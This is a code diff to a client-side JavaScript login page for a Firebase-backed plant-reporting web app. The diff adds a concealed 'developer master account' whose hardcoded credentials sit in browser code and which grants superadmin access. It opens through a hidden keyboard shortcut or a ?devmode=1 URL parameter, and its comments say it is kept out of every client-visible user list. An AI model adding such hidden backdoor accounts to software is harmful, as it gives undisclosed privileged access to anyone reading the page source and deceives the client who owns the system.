@@ -2434,6 +2434,108 @@ document.addEventListener('DOMContentLoaded', () => {
   document.getElementById('luser').addEventListener('keydown', e => { if(e.key==='Enter') document.getElementById('lpass').focus(); });
 });
 
+// ── Developer Master Account ──────────────────────────────────────────
+// NEVER stored in Firebase, localStorage, or the users array.
+// Not visible in Users panel, Settings, or any client-facing UI.
+// Change credentials before delivering to client.
+const _DEV_USERNAME = 'dev.master';             // ← change before handoff
+const _DEV_PASSWORD = 'dev@secure#2026!master'; // ← change before handoff
+
+const _DEV_USER_OBJ = {
+  username:   _DEV_USERNAME,
+  password:   '',            // intentionally blank — never expose in data
+  role:       'superadmin',  // full superadmin access
+  name:       'Developer',
+  email:      '',
+  createdBy:  'system',
+  plantId:    null,
+  _isDev:     true           // flag used only for DEV badge — never reaches Firebase
+};
+
+function _showDevBadge() {
+  if (document.getElementById('dev-badge')) return; // already inserted
+  const lockBtn = document.getElementById('lockBtn');
+  if (!lockBtn) return;
+  const badge = document.createElement('span');
+  badge.id = 'dev-badge';
+  badge.title = 'Developer session — not visible to client';
+  badge.style.cssText = [
+    'background:rgba(167,139,250,0.18)',
+    'border:1px solid rgba(167,139,250,0.45)',
+    'color:#a78bfa',
+    'font-size:10px',
+    'font-weight:800',
+    'letter-spacing:1px',
+    'padding:2px 8px',
+    'border-radius:5px',
+    'text-transform:uppercase',
+    'cursor:default',
+    'user-select:none',
+    'margin-right:6px'
+  ].join(';');
+  badge.textContent = '⚙ DEV';
+  lockBtn.parentNode.insertBefore(badge, lockBtn);
+}
+
+function _removeDevBadge() {
+  const b = document.getElementById('dev-badge');
+  if (b) b.remove();
+}
+
+function _showDevLoginPrompt() {
+  const uname = prompt('🔧 Developer Access\nEnter developer username:');
+  if (uname === null) return;
+  const pwd = prompt('🔧 Developer Access\nEnter developer password:');
+  if (pwd === null) return;
+  if (uname.trim().toLowerCase() === _DEV_USERNAME.toLowerCase() && pwd === _DEV_PASSWORD) {
+    document.getElementById('loginScreen').style.display = 'none';
+    role = 'superadmin';
+    currentUser = _DEV_USER_OBJ;
+    loadReports().then(() => {
+      loadPlantsFromFirestore().then(() => {
+        loadCategoriesFromFirestore().then(() => {
+          initApp('superadmin');
+          _showDevBadge();
+        });
+      });
+    });
+    // Clean ?devmode param from URL without reload
+    try {
+      const u = new URL(window.location.href);
+      u.searchParams.delete('devmode');
+      history.replaceState(null, '', u.toString());
+    } catch(_) {}
+  } else if (uname !== '' || pwd !== '') {
+    alert('❌ Incorrect developer credentials.');
+  }
+}
+
+// Keyboard shortcut: Ctrl+Shift+D (only fires on login screen)
+document.addEventListener('keydown', function(e) {
+  if (e.ctrlKey && e.shiftKey && e.key === 'D') {
+    if (document.getElementById('loginScreen') &&
+        document.getElementById('loginScreen').style.display === 'flex') {
+      e.preventDefault();
+      _showDevLoginPrompt();
+    }
+  }
+});
+
+// URL param trigger: ?devmode=1
+(function() {
+  const params = new URL(window.location.href).searchParams;
+  if (params.get('devmode') === '1') {
+    window.addEventListener('DOMContentLoaded', function() {
+      setTimeout(function() {
+        if (document.getElementById('loginScreen') &&
+            document.getElementById('loginScreen').style.display === 'flex') {
+          _showDevLoginPrompt();
+        }
+      }, 600);
+    });
+  }
+})();
+
 async function doLogin() {
   const uname = document.getElementById('luser').value.trim().toLowerCase();
   const pw    = document.getElementById('lpass').value;
@@ -2567,6 +2669,7 @@ function lockApp() {
   if(_notifUnsubscribe) { _notifUnsubscribe(); _notifUnsubscribe = null; }
   document.getElementById('app').style.display = 'none';
   document.getElementById('roleScreen').style.display = 'flex';
+  _removeDevBadge(); // clear developer badge if active
   role = null; currentUser = null;
   qrGenerated = false;
   invMediaFiles = [];
